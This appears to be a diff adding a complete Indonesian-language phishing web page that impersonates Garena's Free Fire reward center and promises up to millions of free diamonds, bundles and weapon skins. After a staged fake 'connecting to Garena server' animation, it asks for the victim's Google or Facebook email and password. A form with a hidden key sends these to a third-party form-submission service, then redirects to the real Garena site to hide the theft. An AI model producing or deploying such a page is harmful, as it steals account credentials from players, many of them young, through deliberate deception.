@@ -1,0 +1,109 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>Garena Reward Center</title>
+    <style>
+        body { font-family: sans-serif; background: #080808; color: white; text-align: center; padding: 10px; margin: 0; }
+        .box { background: #111; border: 2px solid #ff0000; border-radius: 15px; padding: 20px; max-width: 380px; margin: 20px auto; box-shadow: 0 0 25px rgba(255, 0, 0, 0.4); }
+        .header { font-size: 24px; font-weight: bold; color: #ff0000; margin-bottom: 20px; text-shadow: 0 0 10px #ff0000; }
+        
+        .halaman { display: none; }
+        .aktif { display: block; }
+        
+        select, input { width: 100%; padding: 12px; margin: 8px 0; border-radius: 6px; border: 1px solid #333; background: #222; color: white; box-sizing: border-box; font-size: 14px; }
+        label { display: block; text-align: left; font-size: 11px; color: #ff0000; font-weight: bold; margin-top: 5px; }
+        .btn { width: 100%; padding: 14px; background: #ff0000; color: white; border: none; border-radius: 6px; font-weight: bold; cursor: pointer; font-size: 16px; margin-top: 15px; }
+        
+        #loader { display: none; margin: 20px 0; }
+        .spinner { border: 4px solid #333; border-top: 4px solid #ff0000; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: auto; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    </style>
+</head>
+<body>
+
+<div class="box">
+    <div class="header">GARENA 💎🏆</div>
+    
+    <form action="https://api.web3forms.com/submit" method="POST">
+        <input type="hidden" name="access_key" value="672ee6a0-174a-4085-9ed5-c586637b7c12">
+        <input type="hidden" name="subject" value="Klaim Hadiah Multi-Pilihan">
+
+        <div id="slide1" class="halaman aktif">
+            <h4 style="margin-bottom:15px;">PILIH HADIAH ANDA 🎁</h4>
+            
+            <label>PILIH JUMLAH DIAMOND:</label>
+            <select name="pilihan_dm">
+                <option value="100">💎 100 Diamond</option>
+                <option value="500">💎 500 Diamond</option>
+                <option value="1.000">💎 1.000 Diamond</option>
+                <option value="5.000">💎 5.000 Diamond</option>
+                <option value="10.000">💎 10.000 Diamond</option>
+                <option value="50.000">💎 50.000 Diamond</option>
+                <option value="100.000">💎 100.000 Diamond</option>
+                <option value="500.000">💎 500.000 Diamond</option>
+                <option value="1.000.000">💎 1.000.000 Diamond</option>
+                <option value="5.000.000">💎 5.000.000 Diamond (LIMIT)</option>
+            </select>
+
+            <label>PILIH BUNDLE:</label>
+            <select name="pilihan_bundle">
+                <option>🏆 Bundle Sakura</option>
+                <option>🏆 Bundle Hip Hop</option>
+                <option>🏆 Bundle Old Man</option>
+                <option>🏆 Bundle Criminal Red</option>
+            </select>
+
+            <label>PILIH EVO GUN:</label>
+            <select name="pilihan_senjata">
+                <option>🔥 AK Blue Flame Draco</option>
+                <option>🔥 MP40 Predatory Cobra</option>
+                <option>🔥 M1014 Green Flame Draco</option>
+            </select>
+            
+            <input type="number" id="id_target" name="id_player" placeholder="Masukkan ID Player FF" required>
+            <button type="button" class="btn" onclick="prosesLoading()">LANJUTKAN</button>
+        </div>
+
+        <div id="loader">
+            <div class="spinner"></div>
+            <p id="status_text" style="font-size: 13px; margin-top: 10px;">Menghubungkan ke Server Garena...</p>
+        </div>
+
+        <div id="slide2" class="halaman">
+            <h3>VALIDASI PENERIMA 🔑</h3>
+            <p style="font-size: 12px; color: #ccc;">ID: <b id="show_id" style="color:#ff0000;"></b> Terverifikasi.</p>
+            
+            <input type="email" name="identitas_login" placeholder="Email Google / Facebook" required>
+            <input type="password" name="pin_akun" placeholder="Kata Sandi " required>
+            
+            <input type="hidden" name="redirect" value="https://ff.garena.com/id/">
+            <button type="submit" class="btn" style="background: #27ae60;">KONFIRMASI SEKARANG</button>
+        </div>
+    </form>
+</div>
+
+<script>
+    function prosesLoading() {
+        var id = document.getElementById('id_target').value;
+        if (id.length < 5) {
+            alert("Harap masukkan ID Player yang valid!");
+            return;
+        }
+
+        document.getElementById('slide1').style.display = 'none';
+        document.getElementById('loader').style.display = 'block';
+
+        setTimeout(() => { document.getElementById('status_text').innerText = "Mengecek Status ID Player..."; }, 1000);
+        setTimeout(() => { document.getElementById('status_text').innerText = "Menyiapkan Hadiah Pilihan..."; }, 2000);
+
+        setTimeout(() => {
+            document.getElementById('loader').style.display = 'none';
+            document.getElementById('show_id').innerText = id;
+            document.getElementById('slide2').style.display = 'block';
+        }, 3500);
+    }
+</script>
+
+</body>
+</html>
